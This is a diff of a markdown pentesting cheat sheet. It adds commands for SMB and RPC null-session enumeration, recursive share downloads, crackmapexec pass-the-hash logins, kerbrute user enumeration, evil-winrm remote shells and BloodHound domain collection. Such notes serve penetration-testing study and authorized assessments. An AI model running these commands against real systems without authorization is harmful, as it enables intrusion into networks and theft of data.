@@ -20,24 +20,38 @@ Usage: ./zone_xfer example.com
 ### Sub Domain Takover
 https://www.hackerone.com/blog/Guide-Subdomain-Takeovers
 
+### [rpc Enumeration]
+```
+rpcclient <IP>
+
+rpcclient -U "" <IP>
+
+enumdomusers
+```
+
 ### [SMB Enumeration p445]
 SMBClient
 ```
-Smbclient //ipaddress/share
+smbclient //<IP>/share
+smbclient '//<IP>/share$'
 
 Retrieving data from share
-smbclient //10.1.1.1/share
+smbclient //<IP>/share
 RECURSE ON
 PROMPT OFF
 mget *
 ```
+
 Null Session
 ```
+smbclient -L <IP>
+smbclient -L <IP> -U ''
+smbclient -L <IP> -U '' -P 'abc'
 smbclient -N //IP/Sub
 ```
 SMBv2 Mode
 ```
-smbclient -m SMB2 '//ipaddress/c$/path/to/share' -W <WORKSTATION> -U <username>
+smbclient -m SMB2 '//<IP>/c$/path/to/share' -W <WORKSTATION> -U <username>
 ```
 
 smbmap commands
@@ -59,12 +73,27 @@ smbmap -u <username> -p <hash> -H <ipaddress>
 
 Enum4linux
 ```
-enum4linux -a IP
+enum4linux -a <IP>
 ```
 
 smbcacls
 ```
-smbcacls -N '//IP/Sub' /Users
+smbcacls -N '//<IP>/Sub' /Users
+```
+
+### [Crackmapexec]
+```
+crackmapexec smb <IP> --shares -u ''
+
+crackmapexec smb <IP> --shares -u '' -p ''
+
+crackmapexec smb <IP> --shares -u 'null'
+
+crackmapexec smb <IP> --shares -u 'null' -p ''
+
+crackmapexec winrm <IP> -u USERNAME -p password
+
+crackmapexec winrm <IP> -u USERNAME -H hash
 ```
 
 ### [Kerberos Enumeration p88]
@@ -72,12 +101,21 @@ smbcacls -N '//IP/Sub' /Users
 GetNPUsers.py WORKSTATION/ -dc-ip IP -usersfile /path/to/userslist
 GetNPUsers.py NAME.LOCAL/ -dc-ip IP -usersfile /path/to/userslist
 ```
+
+### [kerbrute]
+Kerberos enumeration using kerbrute github.com/ropnop/kerbrute dowwnload the release   
+```
+kerbrute userenum --dc <IP> -d domain.local -o out_kerbuser.txt users.list  
+```
 resources:
 
 https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
+
 ### [Windows Remote Management WinRM p5985]
+https://github.com/Hackplayers/evil-winrm
+
 ```
-ruby evil-winrm.rb -i IP -u username -p 'password' -s '/path/to/scripts/' -e '/path/to/exes/'
+ruby evil-winrm.rb -i <IP> -u <USERNAME> -p '<PASSWORD>' -s '/path/to/scripts/' -e '/path/to/exes/'
 ```
 Download / Upload
 ```
@@ -86,6 +124,7 @@ download remote_filename
 ```
 
 ### [Mounting NFS]
+
 Display NFS
 ```
 showmount -e IP
@@ -99,8 +138,12 @@ sudo mount -t cifs -o 'user=<USER>,password=<PASSWORD' //<IP>/share /mnt/sharena
 ```
 unmount NFS
 ```
+sudo umount /mnt
 umount -f /tmp/subdirectory
 ```
+
+### [if profiles can be viewed from smb]
+on a folder with profile names type ls > /location/to/output/users.list
 
 ### [firewall evasion]
 ```
@@ -176,3 +219,11 @@ LIST
 Display an email by number
 RETR # 
 ```
+
+### [bloodhound.py]
+https://github.com/fox-it/BloodHound.py
+```
+python3 bloodhound.py -u <USERNAME> -p '<PASSWORD>' -ns <IP> -d domain.local -c all
+```
+
+
